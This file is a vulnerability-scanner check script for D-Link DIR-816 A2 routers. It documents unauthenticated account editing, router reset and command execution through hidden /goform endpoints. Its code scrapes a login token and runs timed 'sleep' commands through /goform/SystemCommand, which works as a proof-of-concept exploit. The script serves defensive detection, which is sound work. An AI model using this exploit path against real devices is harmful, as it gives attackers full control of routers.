if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.113452" );
	script_version( "2020-08-25T06:01:08+0000" );
	script_tag( name: "last_modification", value: "2020-08-25 06:01:08 +0000 (Tue, 25 Aug 2020)" );
	script_tag( name: "creation_date", value: "2019-08-01 12:02:22 +0200 (Thu, 01 Aug 2019)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "D-Link DIR-816 A2 <= 1.11 Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2019 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_dlink_dir_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "d-link/dir/model" );
	script_tag( name: "summary", value: "D-Link DIR-816 devices are prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Tries to execute a command on the device." );
	script_tag( name: "insight", value: "The following vulnerabilities exist:

  - An attacker can get a token from dir_login.asp and use an API URL /goform/setSysAdm
    to edit the web or system account without authentication.

  - An attacker can get a token from dir_login.asp and use a hidden API URL /goform/SystemCommand
    to execute a system command without authentication.

  - An attacker can get a token from dir_login.asp and use a hidden API URL /goform/form2userconfig.cgi
    to edit the system account without authentication.

  - An attacker can get a token form dir_login.asp and use a hidden API URL /goform/LoadDefaultSettings
    to reset the router without authentication." );
	script_tag( name: "impact", value: "Successful exploitation would allow an attacker to gain
  complete control over the target device." );
	script_tag( name: "affected", value: "D-Link DIR-816 A2 through firmware version 1.11." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/remote_cmd_exec_0/README.md" );
	script_xref( name: "URL", value: "https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/edit_sys_account/README.md" );
	script_xref( name: "URL", value: "https://github.com/PAGalaxyLab/VulInfo/blob/master/D-Link/DIR-816/reset_router/README.md" );
	exit( 0 );
}
CPE = "cpe:/h:d-link:dir-816";
require("host_details.inc.sc");
require("misc_func.inc.sc");
require("list_array_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
start = unixtime();
req = http_get( item: "/dir_login.asp", port: port );
buf = http_keepalive_send_recv( data: req, port: port );
stop = unixtime();
tk = eregmatch( string: buf, pattern: "name=[\"\']tokenid[\"\'] *value=[\"\']([0-9a-z]+)[\"\']" );
if(!token = tk[1]){
	exit( 0 );
}
latency = stop - start;
vuln_url = "/goform/SystemCommand";
count = 0;
i = 0;
add_headers = make_array( "Content-Type", "application/x-www-form-urlencoded" );
report = "It was possible to execute multiple \"sleep\" commands on the target system and verify the existence of the vulnerability by checking the response time.\n\n";
info["Affected URL"] = http_report_vuln_url( port: port, url: vuln_url, url_only: TRUE );
info["HTTP Method"] = "POST";
for sleep in make_list( 3,
	 5,
	 7 ) {
	++i;
	data = "command=sleep " + sleep + "&tokenid=" + token;
	req = http_post_put_req( port: port, url: vuln_url, add_headers: add_headers, data: data, host_header_use_ip: TRUE );
	start = unixtime();
	res = http_keepalive_send_recv( data: req, port: port );
	stop = unixtime();
	time = stop - start;
	if(time >= sleep && time <= ( sleep + latency )){
		count++;
		info[NASLString( "HTTP POST body ", i, ":" )] = data;
		info[NASLString( "HTTP POST body ", i, " response time:" )] = time;
	}
}
if(count >= 2){
	report += text_format_table( array: info );
	security_message( data: report, port: port );
	exit( 0 );
}
exit( 99 );

